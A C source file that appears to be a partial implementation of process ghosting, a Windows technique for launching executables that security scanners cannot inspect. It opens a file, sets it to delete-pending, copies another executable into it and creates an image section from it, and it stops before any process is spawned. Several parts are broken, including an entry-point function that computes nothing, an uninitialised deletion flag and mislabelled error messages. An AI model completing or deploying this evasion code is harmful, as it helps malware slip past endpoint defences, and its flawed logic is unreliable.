#include <io.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include "ghosted.h"

#pragma comment(lib, "ntdll")

unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
	HANDLE hmap;
	LPVOID base_addr;
	ULARGE_INTEGER mapping_size;
	unsigned int entry_point = 0;

	mapping_size.QuadPart = f_size;
	
	// Create file mapping
	hmap = CreateFileMappingA(
		hfile,
		NULL,
		PAGE_READONLY,
		0,
		0, 
		NULL);

	if (hmap == NULL) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession()\n");
		return 0;
	}
	
	base_addr = MapViewOfFile(
		hmap, 
		FILE_MAP_READ, 
		0, 
		0, 
		mapping_size.LowPart);

	if (NULL == base_addr) {
		fprintf(stderr, "[!] MapViewOfFile() failed (0x%x)\n", GetLastError());
		return 0;
	}
	return 1;
}

int spawn_process(char* real_exe, char* fake_exe) {
	uint32_t rva_entryp;
	NTSTATUS _status;
	DWORD ho_fsz, lo_fsz;
	IO_STATUS_BLOCK io_status;
	HANDLE hfakefile, hrealfile,hsection;
	FILE_DISPOSITION_INFORMATION f_fileinfo;
	
	printf("[i] Real Exe:\t\t%s\n", real_exe);
	printf("[i] Fake Exe:\t\t%s\n", fake_exe);

	// Create fake file 
	hfakefile = CreateFileA(
		fake_exe, 
		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hfakefile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to create: %s(0x%x)\n", fake_exe, GetLastError());
		return -1;
	}

	printf("[i] Created File:\t%s\n", fake_exe);

	// Setting Target File in Delete Pending State
	RtlZeroMemory(&io_status, sizeof(io_status));
	FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
	_status = NtSetInformationFile(
		hfakefile, 
		&io_status, 
		&f_fileinfo, 
		sizeof(f_fileinfo),
		f_info);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtSetInformationFile failed (0x%x)\n", _status);
		CloseHandle(hfakefile);
		return -2;
	}

	if (!NT_SUCCESS(io_status.Status)) {
		fprintf(stderr, "[!] Failed to put file in 'Delete-Pending' State (0x%x)\n", _status);
		CloseHandle(hfakefile);
		return -2;
	}

	printf("[i] Successfully put file in 'Delete-Pending' mode\n");

	// Open the original file for reading
	hrealfile = CreateFileA(
		real_exe, 
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if (hrealfile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to get handle for:\t%s (0x%x)\n", real_exe, GetLastError());
		CloseHandle(hfakefile);
		return -3;
	}
	
	// Get File Size
	lo_fsz = GetFileSize(hrealfile, &ho_fsz);
	if (lo_fsz == INVALID_FILE_SIZE) {
		fprintf(stderr, "[!] Failed to get file size (0x%x)\n", GetLastError());
		CloseHandle(hrealfile);
		CloseHandle(hfakefile);
		return -4;
	}
	printf("[i] File Size:\t\t%d\n", lo_fsz);

	// Allocate memory
	unsigned char* s_bytes = (unsigned char*)malloc(lo_fsz);
	if (s_bytes == NULL) {
		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
		CloseHandle(hrealfile);
		CloseHandle(hfakefile);
		return -5;
	}

	// Read File
	BOOL result = ReadFile(
		hrealfile,
		s_bytes,
		lo_fsz,
		&ho_fsz,
		NULL
	);

	if (!result) {
		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", real_exe, GetLastError());
		free(s_bytes);
		CloseHandle(hrealfile);
		CloseHandle(hfakefile);
		return -6;
	}
	CloseHandle(hrealfile);
	
	// Write to Fake Exe
	result = WriteFile(
		hfakefile,
		(LPCVOID)s_bytes,
		lo_fsz,
		&ho_fsz,
		NULL
	);

	if (!result) {
		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", fake_exe, GetLastError());
		free(s_bytes);
		CloseHandle(hfakefile);
		return -7;
	}
	free(s_bytes);
	printf("[i] Wrote bytes to:\t%s\n", fake_exe);
	
	// Create section object
	hsection = 0;
	_status = NtCreateSection(
		&hsection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY, 
		SEC_IMAGE,
		hfakefile
	);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtCreateSession() failed! (0x%x)\n", _status);
		CloseHandle(hfakefile);
		return -8;
	}

	if (hsection == INVALID_HANDLE_VALUE || hsection == NULL) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession()\n");
		CloseHandle(hfakefile);
		return -9;
	}

	printf("[i] Created a session object!\n");



	CloseHandle(hsection);
	CloseHandle(hfakefile);
	return 0;
}

int main(int argc, char** argv) {
	
	if (argc != 3) {
		fprintf(stderr, "[!] Invalid Usage\n");
		fprintf(stderr, "[i] Usage: %s <REAL EXE> <FAKE EXE>\n", argv[0]);
		return -1;
	}

	char real_exe[MAX_PATH] = { 0 };
	char fake_exe[MAX_PATH] = { 0 };

	strcpy_s(real_exe, MAX_PATH, argv[1]);
	strcpy_s(fake_exe, MAX_PATH, argv[2]);

	// Check if real_exe exists with READ permissions
	if (_access_s(real_exe, 4) != 0) {
		fprintf(stderr, "[!] Failed to access:\t%s\n", real_exe);
		return -2;
	}

	// Check fake_exe does not exist
	if (_access_s(fake_exe, 0) == 0) {
		fprintf(stderr, "[!] File already present:\t%s\n", fake_exe);
		return -3;
	}

	int result = spawn_process(real_exe, fake_exe);

	return result;
}